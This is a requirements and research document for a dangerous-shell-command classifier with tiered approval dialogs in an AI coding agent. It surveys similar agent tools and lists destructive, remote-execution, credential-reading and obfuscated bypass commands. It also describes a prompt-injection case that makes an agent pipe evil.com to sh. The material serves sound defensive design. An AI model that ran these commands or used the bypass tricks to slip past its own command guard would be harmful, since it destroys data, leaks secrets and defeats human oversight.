# Raw Requirement: P0-1 Dangerous Command Rule Library + Graded Approval Trigger

## Source

`doc/prd/feature-todo.md` — first unimplemented entry:

> **P0-1 危险命令规则库 + 分级审批触发** | 安全 | 依赖：无 | 难度：低 | 可复用：`vage/tool/bash/`、`vv/cli/` 三态对话框
>
> BashTool 前置拦截层直接叠加正则规则库（rm -rf、sudo、curl\|sh 等）；现有 Allow/Deny 对话框天然承接"高风险命令需二次确认"；零新抽象，ROI 最高。

## User ask

Build this feature. First do detailed requirement research: similar products, common implementation approaches, pitfalls to watch for; industry research on concrete schemes. Use that to inform the design. After implementation, remove the entry from `feature-todo.md` and add it to `feature-implement.md`.

---

## Industry Research

### How similar AI coding agents gate dangerous shell commands

**Anthropic Claude Code** uses prefix-based permission rules keyed on tool name plus a parsed command prefix, stored in `~/.claude/settings.json` under `permissions.allow | deny | ask` (e.g. `"Bash(npm run test:*)"`, `"Bash(rm)"`). Commands containing `$(...)`, backticks, `;`, `&&`, `||`, or pipes are split and each sub-command is matched independently. Four permission modes (`default`, `acceptEdits`, `plan`, `bypassPermissions`); the last is "YOLO" and documented as sandbox-only. The confirmation dialog is three-state: Yes / Yes-and-don't-ask-again-for-prefix / No. PreToolUse/PostToolUse hooks let users run custom scripts that return `{"decision": "approve"|"block"}`.
*(https://docs.claude.com/en/docs/claude-code/iam, .../settings, .../hooks, .../security)*

**Google Gemini CLI** — `run_shell_command` tool with `coreTools`/`excludeTools` in `settings.json`. Same prefix-match + chain-split model as Claude Code. `--yolo` bypasses confirmation.
*(https://github.com/google-gemini/gemini-cli, `docs/tools/shell.md`)*

**Cursor** — Settings → Agent → Command Allowlist/Denylist (substring match). Auto-run global toggle. Cursor 0.43+ added a separate confirmation for file deletes even under auto-run.
*(https://docs.cursor.com/agent/command-allowlist)*

**Cline (VS Code)** — Auto-Approve panel with per-capability checkboxes (Read/Edit/Execute-Safe/Execute-All/Browser/MCP). "Safe commands" is a hard-coded allowlist (`ls`, `cat`, `pwd`, `git status`, `npm test`…) in `src/core/tools/executeCommandTool.ts`. Anything else prompts.
*(https://github.com/cline/cline, https://docs.cline.bot/features/auto-approve)*

**OpenAI Codex CLI** — three `approval_mode`s (`suggest` / `auto-edit` / `full-auto`). `full-auto` auto-approves but only inside a **macOS Seatbelt / Linux Landlock sandbox** that blocks network and confines writes to the workspace. Sandbox is the primary defense.
*(https://github.com/openai/codex)*

**OpenHands (OpenDevin)** — runs inside a **Docker sandbox by default** (`runtime: docker`); `confirmation_mode` toggles prompt-per-call. No rule library — sandbox is the defense.
*(https://docs.all-hands.dev/modules/usage/configuration)*

**Aider / Continue** — binary (prompt-or-don't) approval; tool-level granularity only.

### Common patterns across products

1. Prefix-match on a parsed command (Claude Code, Gemini CLI) — low complexity, covers the common case.
2. **Split on shell metacharacters** (`;`, `&&`, `||`, `|`, `$(...)`, backticks) before matching — universal defense against chained bypass.
3. Three-state dialog: Allow-once / Allow-always-for-prefix / Deny — de facto standard UX.
4. Mode flags (`--yolo`, `--dangerously-skip-permissions`, `full-auto`) for sandboxed/CI use.
5. Per-project scope for "allow always" so rules don't leak across repos.

---

## Dangerous-Command Taxonomy

| Category | Examples | Notes |
|---|---|---|
| Destructive FS | `rm -rf`, `rm -rf /`, `dd if=…of=/dev/`, `mkfs.*`, `shred`, `> /dev/sda`, `:(){:\|:&};:` | `rm -rf $UNSET_VAR/` expands to `rm -rf /` when the var is empty. |
| Privilege escalation | `sudo`, `su`, `doas`, `pkexec` | Agent has no business escalating. |
| Remote code execution | `curl … \| sh`, `wget … \| bash`, `bash <(curl …)`, `pip install <url>`, `npm install -g` | The single most-common supply-chain attack vector. |
| Credential exfiltration | `cat ~/.ssh/id_*`, `cat ~/.aws/credentials`, `cat ~/.netrc`, `env`, `printenv`, `cat /etc/shadow`, `grep -r "token\|secret\|key"` | Reads of well-known secret paths. |
| Network surface | `nc -l`, `ssh user@host`, `scp`, `rsync -e ssh`, `nmap` | Outbound arbitrary network = exfiltration channel. |
| System mutation | `systemctl`, `launchctl`, `apt install`, `brew install`, `chmod 777 /`, `chown` | Changes state beyond the workspace. |
| Git destructive | `git push --force`, `git reset --hard`, `git clean -fd`, `git branch -D`, `git filter-branch` | Already enumerated in this repo's CLAUDE.md. |
| Kernel/container | `docker rm -f`, `docker system prune -a`, `kubectl delete`, `iptables -F`, `modprobe` | |
| Shell bypass tricks | `$(cmd)`, ``` `cmd` ```, `;`, `&&`, `\|\|`, `\|`, `eval "$var"`, `sh -c "…"`, `xargs sh`, `find … -exec rm` | Must be caught at the parser/splitter level. |

## Known pitfalls and red-team findings

- **Prompt injection via tool output.** Attacker-controlled file content instructs the agent to run `curl evil.com/x.sh | sh`. Defense: classify the **parsed command**, not the LLM's stated intent. (Lethal-trifecta writeups — https://simonwillison.net/2025/Apr/25/lethal-trifecta/)
- **Chained/obfuscated bypass.** `X=rm; $X -rf /`, `${IFS}`, `$'\x72m'`, `"r""m"`, `/bin/rm`. Pure `startsWith("rm")` fails on all of these. Cline issue-tracker documented a bypass where the denylist missed `/bin/rm`.
- **Indirect invocation.** `xargs rm`, `find . -delete`, `git clean -fd`, `tar --remove-files`, `npm run <script>` with a malicious `package.json`.
- **Redirect-as-delete.** `: > important.db`, `truncate -s 0 file`.
- **Alias/function hijacking.** Long-lived shell where prior commands `alias ls='rm -rf ~'`. Defense: always `bash -c` with a clean environment; don't reuse shells.
- **False-positive fatigue.** Users hit "Allow Always" on an overly-broad pattern to stop prompts, then a later dangerous invocation sneaks through under that allowance. Mitigation: never offer Allow-Always for dangerous-tier commands.
- **Working-dir escape.** Even confined to a workspace, `rm -rf ../../..`, absolute paths, symlink-follow can escape.

## Implementation approaches compared

| Approach | Pros | Cons |
|---|---|---|
| Regex/prefix allowlist (Claude Code, Gemini CLI) | Trivial, fast, user-extensible | Fails on obfuscation unless paired with metacharacter-split pre-pass. |
| AST parsing (`mvdan/sh`) | Correctly handles `$(...)`, heredocs, redirects | More code; still can't resolve `$VAR` values. |
| OS sandbox (Docker, firejail, seatbelt, landlock) | Defense-in-depth; OpenHands/Codex model | Heavy; platform-specific. P1+. |
| Policy engine (OPA, Cedar) | Declarative, auditable | Overkill for per-user CLI. |

## P0 scope (per feature-todo.md: "low difficulty, zero new abstractions")

- **Regex rule library** + simple metacharacter split; no AST dependency for P0.
- **Hard-coded default rules** in `vage/tool/bash/` + user extensions from `~/.vv/vv.yaml`.
- **Reuse existing three-state confirmation dialog** in `vv/cli/`; change behavior (not structure) based on tier.
- Explicitly deferred: sandbox/seccomp (P4-4), per-directory scope, policy engine, LLM-as-judge.

## Integration seam (codebase findings)

- **Insertion point** is at the permission layer, not inside `BashTool.execute()` — the classifier has to run *before* the dialog so it can influence dialog options. `vv/cli/permission.go` `permissionExecutor.Execute()` is the natural hook: when `name == "bash"`, parse args → classify → route.
- **Classifier itself** belongs in `vage/tool/bash/` (reusable across consumers; no vv dependency).
- **Config** extends `ToolsConfig` in `vv/configs/config.go` with a `BashRules` sub-struct (enabled, user patterns).
- **No new guard interface needed.** `vage/guard/` is a message-content chain (Pass/Block/Rewrite), architecturally different from command classification. Reuse the mental model; don't share the interface.
- **Hooks are read-only** (`vage/hook/`) — can't veto tool calls, so not useful here. Wrapper at permission layer is correct.
- **No existing shell-parsing dep** (`mvdan/sh` absent from go.mod in all three modules) — confirmed. P0 stays regex-only to keep zero-dep.

## Success criteria

1. Running `rm -rf /` **never** executes regardless of permission mode or user click.
2. Running `ls`, `pwd`, `git status`, `go test …` bypasses the confirmation dialog in default mode (zero friction for safe commands).
3. Running `curl x.sh | bash` prompts with a dangerous-tier dialog that does **not** offer "Allow Always".
4. Running `rm -rf src/build/` prompts with the standard three-option dialog (caution tier) and respects Allow-Always for the session.
5. Chained commands (`ls && rm -rf /`) are classified by their most-dangerous component.
6. Users can extend the dangerous/blocked/safe lists via `~/.vv/vv.yaml`.
7. Existing CLI `auto` mode is unchanged for safe/caution/dangerous; hard-block still applies (defense-in-depth).

## Known P0 limitations (documented, not fixed)

- No variable-value resolution — `X=rm; $X -rf /` may slip through.
- No per-directory "allow-always" scope — session-wide only.
- No sandbox/seccomp — OS-level containment is P4-4.
- No LLM-based intent review — deliberate non-goal.

---

## Q&A log (analyst clarifications)

*None yet — see `requirement.md` for structured follow-up.*
